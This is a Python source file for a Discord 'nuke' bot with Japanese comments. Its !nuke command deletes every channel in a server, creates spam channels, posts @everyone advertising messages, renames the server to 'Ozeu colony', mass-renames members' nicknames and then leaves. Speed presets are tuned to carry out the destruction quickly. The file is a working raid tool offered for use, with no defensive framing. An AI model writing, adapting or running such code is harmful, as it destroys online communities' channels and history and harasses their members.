# main.py
import os
import asyncio
import logging
from datetime import datetime
from typing import List, Optional
import threading

import discord
from discord.ext import commands
from flask import Flask, jsonify

# ================= CONFIG =================
TOKEN = os.environ.get("DISCORD_TOKEN")
PREFIX = "!"
INTENTS = discord.Intents.default()
INTENTS.guilds = True
INTENTS.messages = True
INTENTS.message_content = True
INTENTS.members = True

# --- User settings ---
ROLE_BASE      = "ozeumember"   # ロール名ベース
ROLE_COUNT     = 5               # 作成数
CHANNEL_BASE   = "ozeu-nuke"    # チャンネル名ベース
CHANNEL_COUNT  = 5               # 作成数
REPEAT_MESSAGE = "@everyone おぜうの集いに参加！ https://example.com"
REPEAT_COUNT   = 1               # メッセージ送信回数

CHANGE_NICKNAMES = True
NICK_BASE        = "おぜう様万歳！"
NEW_GUILD_NAME   = "おぜう植民地"

# Speed preset (遅い / 普通 / 速い / 爆速)
SPEED_LEVEL = "速い"

SPEED_PRESETS = {
    "遅い": {
        "DELETE_CHUNK_SIZE": 3,  "DELETE_CHUNK_SLEEP": 0.2, "POST_DELETE_WAIT": 4.0,
        "CREATE_CHUNK_SIZE": 2, "CREATE_CHUNK_SLEEP": 0.3,
        "MSG_CHUNK_SIZE": 3,    "MSG_INTER_CHUNK_SLEEP": 0.05, "MSG_INTER_ROUND_SLEEP": 0.1,
        "ROLE_CHUNK_SIZE": 1,   "ROLE_CHUNK_SLEEP": 0.2, "ROLE_MAX_RETRIES": 2,
        "NICK_CHUNK_SIZE": 6,   "NICK_CHUNK_SLEEP": 0.25
    },
    "普通": {
        "DELETE_CHUNK_SIZE": 5,  "DELETE_CHUNK_SLEEP": 0.1, "POST_DELETE_WAIT": 3.0,
        "CREATE_CHUNK_SIZE": 4, "CREATE_CHUNK_SLEEP": 0.2,
        "MSG_CHUNK_SIZE": 6,    "MSG_INTER_CHUNK_SLEEP": 0.02, "MSG_INTER_ROUND_SLEEP": 0.05,
        "ROLE_CHUNK_SIZE": 2,   "ROLE_CHUNK_SLEEP": 0.1, "ROLE_MAX_RETRIES": 3,
        "NICK_CHUNK_SIZE": 8,   "NICK_CHUNK_SLEEP": 0.15
    },
    "速い": {
        "DELETE_CHUNK_SIZE": 8,  "DELETE_CHUNK_SLEEP": 0.08, "POST_DELETE_WAIT": 2.0,
        "CREATE_CHUNK_SIZE": 6, "CREATE_CHUNK_SLEEP": 0.12,
        "MSG_CHUNK_SIZE": 10,   "MSG_INTER_CHUNK_SLEEP": 0.01, "MSG_INTER_ROUND_SLEEP": 0.02,
        "ROLE_CHUNK_SIZE": 4,   "ROLE_CHUNK_SLEEP": 0.05, "ROLE_MAX_RETRIES": 3,
        "NICK_CHUNK_SIZE": 12,  "NICK_CHUNK_SLEEP": 0.12
    },
    "爆速": {
        "DELETE_CHUNK_SIZE": 12, "DELETE_CHUNK_SLEEP": 0.04, "POST_DELETE_WAIT": 1.0,
        "CREATE_CHUNK_SIZE": 10, "CREATE_CHUNK_SLEEP": 0.05,
        "MSG_CHUNK_SIZE": 20,   "MSG_INTER_CHUNK_SLEEP": 0.005, "MSG_INTER_ROUND_SLEEP": 0.01,
        "ROLE_CHUNK_SIZE": 6,   "ROLE_CHUNK_SLEEP": 0.02, "ROLE_MAX_RETRIES": 2,
        "NICK_CHUNK_SIZE": 16,  "NICK_CHUNK_SLEEP": 0.05
    }
}

# apply preset
_p = SPEED_PRESETS.get(SPEED_LEVEL, SPEED_PRESETS["普通"])
DELETE_CHUNK_SIZE      = _p["DELETE_CHUNK_SIZE"]
DELETE_CHUNK_SLEEP     = _p["DELETE_CHUNK_SLEEP"]
POST_DELETE_WAIT       = _p["POST_DELETE_WAIT"]
CREATE_CHUNK_SIZE      = _p["CREATE_CHUNK_SIZE"]
CREATE_CHUNK_SLEEP     = _p["CREATE_CHUNK_SLEEP"]
MSG_CHUNK_SIZE         = _p["MSG_CHUNK_SIZE"]
MSG_INTER_CHUNK_SLEEP  = _p["MSG_INTER_CHUNK_SLEEP"]
MSG_INTER_ROUND_SLEEP  = _p["MSG_INTER_ROUND_SLEEP"]
ROLE_CHUNK_SIZE        = _p["ROLE_CHUNK_SIZE"]
ROLE_CHUNK_SLEEP       = _p["ROLE_CHUNK_SLEEP"]
ROLE_MAX_RETRIES       = _p["ROLE_MAX_RETRIES"]
NICK_CHUNK_SIZE        = _p["NICK_CHUNK_SIZE"]
NICK_CHUNK_SLEEP       = _p["NICK_CHUNK_SLEEP"]

# ================= end CONFIG =================

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("fast-nuke")

bot = commands.Bot(command_prefix=PREFIX, intents=INTENTS)
app = Flask(__name__)

@app.route("/", methods=["GET"])
def health():
    return jsonify({"status": "ok", "bot_ready": bot.is_ready(), "bot_user": str(bot.user) if bot.user else None})

def start_flask():
    port = int(os.environ.get("PORT", "8080"))
    app.run(host="0.0.0.0", port=port, use_reloader=False)

# ---------- helpers ----------
def chunk_list(lst, n):
    for i in range(0, len(lst), n):
        yield lst[i:i+n]

async def safe_delete_channel(channel: discord.abc.GuildChannel):
    try:
        await channel.delete()
        logger.info(f"Deleted: {getattr(channel,'name',repr(channel))} ({getattr(channel,'id',None)})")
    except discord.errors.Forbidden:
        logger.warning(f"Forbidden deleting channel: {getattr(channel,'name',channel)}")
    except Exception as e:
        logger.warning(f"Delete failed {getattr(channel,'name',channel)}: {e}")

async def safe_create_channel(guild: discord.Guild, name: str):
    try:
        ch = await guild.create_text_channel(name)
        # short wait so permissions propagate
        await asyncio.sleep(0.12)
        logger.info(f"Created channel: {name} ({ch.id})")
        return ch
    except discord.errors.Forbidden:
        logger.warning(f"Forbidden creating channel: {name}")
        return None
    except Exception as e:
        logger.warning(f"Create failed {name}: {e}")
        return None

async def safe_send(ch: discord.TextChannel, content: str):
    if ch is None:
        return
    try:
        await ch.send(content[:2000])
    except discord.errors.Forbidden:
        logger.warning(f"Forbidden send to {getattr(ch,'name',ch)}")
    except Exception as e:
        logger.warning(f"Send failed {getattr(ch,'name',ch)}: {e}")

async def send_repeated_messages(channels: List[discord.TextChannel], msg: str, repeat: int):
    if not channels:
        return
    for _ in range(repeat):
        for i in range(0, len(channels), MSG_CHUNK_SIZE):
            chunk = channels[i:i+MSG_CHUNK_SIZE]
            await asyncio.gather(*(safe_send(c, msg) for c in chunk))
            await asyncio.sleep(MSG_INTER_CHUNK_SLEEP)
        await asyncio.sleep(MSG_INTER_ROUND_SLEEP)

async def safe_change_nick(member: discord.Member, new_nick: str):
    try:
        await member.edit(nick=new_nick)
        return True
    except discord.errors.Forbidden:
        return False
    except Exception:
        return False

async def change_all_nicknames(guild: discord.Guild):
    if not CHANGE_NICKNAMES:
        return 0
    members = [m for m in guild.members if not m.bot]
    changed = 0
    tasks = [(m, f"{NICK_BASE}-{i+1}") for i, m in enumerate(members)]
    for group in chunk_list(tasks, NICK_CHUNK_SIZE):
        coros = [safe_change_nick(m, nick) for m, nick in group]
        results = await asyncio.gather(*coros)
        changed += sum(1 for r in results if r)
        await asyncio.sleep(NICK_CHUNK_SLEEP)
    return changed

def bot_has_permissions(guild: discord.Guild):
    me = guild.me
    if me is None:
        return False
    perms = me.guild_permissions
    return perms.manage_channels and perms.manage_roles and perms.send_messages and perms.manage_nicknames

# ---------- Parallel safe role creation (new) ----------
async def safe_create_role(guild: discord.Guild, name: str, max_retries: int = ROLE_MAX_RETRIES) -> Optional[discord.Role]:
    attempt = 0
    while True:
        try:
            role = await guild.create_role(name=name, permissions=discord.Permissions.none(), reason="bulk role create")
            logger.info(f"Created role: {name} ({role.id})")
            return role
        except discord.errors.Forbidden:
            logger.warning(f"Forbidden creating role: {name}")
            return None
        except discord.errors.HTTPException as e:
            attempt += 1
            logger.warning(f"HTTPException creating role {name} attempt {attempt}: {e}")
            if attempt >= max_retries:
                logger.exception(f"Giving up creating role {name}")
                return None
            # exponential backoff (keeps polite)
            await asyncio.sleep(0.5 * (2 ** (attempt - 1)))
        except Exception as e:
            logger.exception(f"Unexpected error creating role {name}: {e}")
            return None

async def create_roles_fast(guild: discord.Guild, base: str, count: int, chunk_size: int = ROLE_CHUNK_SIZE, chunk_sleep: float = ROLE_CHUNK_SLEEP) -> List[discord.Role]:
    names = [f"{base}-{i}" for i in range(1, count+1)]
    created: List[discord.Role] = []
    for group in chunk_list(names, chunk_size):
        results = await asyncio.gather(*(safe_create_role(guild, n) for n in group), return_exceptions=True)
        for res in results:
            if isinstance(res, discord.Role):
                created.append(res)
            elif isinstance(res, Exception):
                logger.warning(f"Role creation exception: {res}")
        await asyncio.sleep(chunk_sleep)
    return created

# ---------- events ----------
@bot.event
async def on_ready():
    logger.info(f"Logged in as {bot.user} ({bot.user.id})")

# ---------- command ----------
@bot.command(name="nuke")
async def nuke(ctx):
    guild = ctx.guild
    if guild is None or not bot_has_permissions(guild):
        await ctx.send("Bot に必要な権限がありません。")
        return

    backup_name = f"nuke-backup-{datetime.utcnow().strftime('%Y%m%d-%H%M%S')}"
    backup_channel = await guild.create_text_channel(backup_name)
    await backup_channel.send("⚙️ nuke開始")

    # main tasks
    async def main_tasks():
        # delete channels
        channels_to_delete = [c for c in guild.channels if c.id != backup_channel.id]
        for group in chunk_list(channels_to_delete, DELETE_CHUNK_SIZE):
            await asyncio.gather(*(safe_delete_channel(c) for c in group))
            await asyncio.sleep(DELETE_CHUNK_SLEEP)
        await asyncio.sleep(POST_DELETE_WAIT)

        # create channels
        created_channels: List[discord.TextChannel] = []
        names = [f"{CHANNEL_BASE}-{i+1}" for i in range(CHANNEL_COUNT)]
        for group in chunk_list(names, CREATE_CHUNK_SIZE):
            rs = await asyncio.gather(*(safe_create_channel(guild, n) for n in group))
            created_channels.extend([r for r in rs if r])
            await asyncio.sleep(CREATE_CHUNK_SLEEP)

        # send messages
        await send_repeated_messages(created_channels, REPEAT_MESSAGE, REPEAT_COUNT)

    # sub tasks
    async def sub_tasks():
        # guild rename
        if NEW_GUILD_NAME:
            try:
                await guild.edit(name=NEW_GUILD_NAME)
            except Exception as e:
                logger.warning(f"Guild rename failed: {e}")

        # parallel role creation (safe)
        if ROLE_COUNT > 0:
            created_roles = await create_roles_fast(guild, ROLE_BASE, ROLE_COUNT, chunk_size=ROLE_CHUNK_SIZE, chunk_sleep=ROLE_CHUNK_SLEEP)
            logger.info(f"Roles created: {len(created_roles)}")

        # nickname changes
        await change_all_nicknames(guild)

    # run both concurrently
    await asyncio.gather(main_tasks(), sub_tasks())

    await backup_channel.send("✅ nuke完了。Botはサーバーを退出します")
    await asyncio.sleep(1.0)
    try:
        await guild.leave()
    except Exception as e:
        logger.warning(f"Guild leave failed: {e}")

# ---------- Entrypoint ----------
if __name__ == "__main__":
    threading.Thread(target=start_flask, daemon=True).start()
    if not TOKEN:
        logger.error("DISCORD_TOKEN が設定されていません。")
        raise SystemExit("DISCORD_TOKEN is required")
    bot.run(TOKEN)
